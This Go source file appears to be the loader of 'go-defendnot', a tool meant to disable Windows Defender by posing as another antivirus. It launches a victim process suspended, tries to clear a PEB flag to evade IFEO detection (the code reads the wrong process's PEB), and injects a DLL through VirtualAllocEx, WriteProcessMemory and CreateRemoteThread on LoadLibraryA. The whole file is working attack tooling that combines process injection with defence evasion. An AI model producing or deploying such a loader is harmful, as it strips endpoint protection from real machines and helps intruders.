package main

import (
	"flag"
	"fmt"
	"github.com/Gr-1m/sys/windows"
	"github.com/Gr-1m/sys/windows/extra"
	"go-defendnot/defendnot-loader/loader"
	"log"
	"unsafe"
)

type PEBr1 struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte // IFEO检测关键字段
}

func createSuspendedProcess(exePath string) (*windows.ProcessInformation, error) {
	// 实现创建挂起进程的完整逻辑...
	si := windows.StartupInfo{}
	pi := windows.ProcessInformation{}
	err := windows.CreateProcess(nil, windows.StringToUTF16Ptr(exePath), nil, nil, false,
		windows.DEBUG_PROCESS|windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
	if err != nil {
		return nil, err
	}
	// 绕过IFEO检测
	peb := getProcessPeb(pi.Process)
	peb.ReadImageFileExecOptions = 0 // 修改PEB标志

	return &pi, nil
}

func getProcessPeb(proc windows.Handle) *PEBr1 {
	var pbi = new(windows.PROCESS_BASIC_INFORMATION)

	err := windows.NtQueryInformationProcess(proc, windows.ProcessBasicInformation, unsafe.Pointer(pbi), uint32(unsafe.Sizeof(*pbi)), nil)
	if err != nil {
		return nil
	}
	peb := windows.RtlGetCurrentPeb()

	return (*PEBr1)(unsafe.Pointer(peb))
}

func getLoadLibraryAddress() (uintptr, error) {
	// 获取kernel32.dll中的LoadLibraryA地址...
	//windows.NewLazyDLL("kernel32.dll").NewProc("LoadLibraryA")
	proc, err := windows.MustLoadDLL("kernel32.dll").FindProc("LoadLibraryA")
	if err != nil {
		return 0, err
	}
	return proc.Addr(), nil
}

func InjectDLL(dllPath, procName string) error {
	// 1. 创建挂起进程
	pi, err := createSuspendedProcess(procName)
	if err != nil {
		return fmt.Errorf("创建进程失败: %v", err)
	}
	defer windows.CloseHandle(pi.Thread)

	fmt.Println(1)
	// 2. 在目标进程分配内存
	memAddr, err := extra.VirtualAllocEx(pi.Process, 0, uintptr(len(dllPath)+1), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if err != nil {
		return fmt.Errorf("内存分配失败: %v", err)
	}
	fmt.Println(2)

	// 3. 写入DLL路径
	dllPathBytes := append([]byte(dllPath), 0) // 添加null终止符
	err = windows.WriteProcessMemory(pi.Process, memAddr, &dllPathBytes[0], uintptr(len(dllPathBytes)), nil)

	if err != nil {
		return fmt.Errorf("写入内存失败: %v", err)
	}
	fmt.Println(3)

	// 4. 获取LoadLibraryA地址
	loadLibraryAddr, err := getLoadLibraryAddress()
	if err != nil {
		return fmt.Errorf("獲取LoadLibA地址失敗: %v", err)
	}
	fmt.Println(4)

	// 5. 创建远程线程
	threadHandle, err := extra.CreateRemoteThread(pi.Process, nil, 0, loadLibraryAddr, memAddr, 0, nil)
	if threadHandle == 0 {
		return fmt.Errorf("创建线程失败: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(threadHandle))
	fmt.Println(5)

	// 6. 等待线程完成
	_, err = windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
	if err != nil {
		return fmt.Errorf("等待线程失败: %v", err)
	}

	return nil
}

func main() {
	var argsConfig = &loader.ArgsConfig{}
	flag.StringVar(&argsConfig.Name, "n", loader.RepoUrl, "av display name")
	flag.BoolVar(&argsConfig.Disable, "d", false, "disable defendnot")
	//flag.Usage()
	flag.Parse()

	if err := InjectDLL(loader.DllName, loader.VictimProcess); err != nil {
		log.Fatal(err)
	}
}
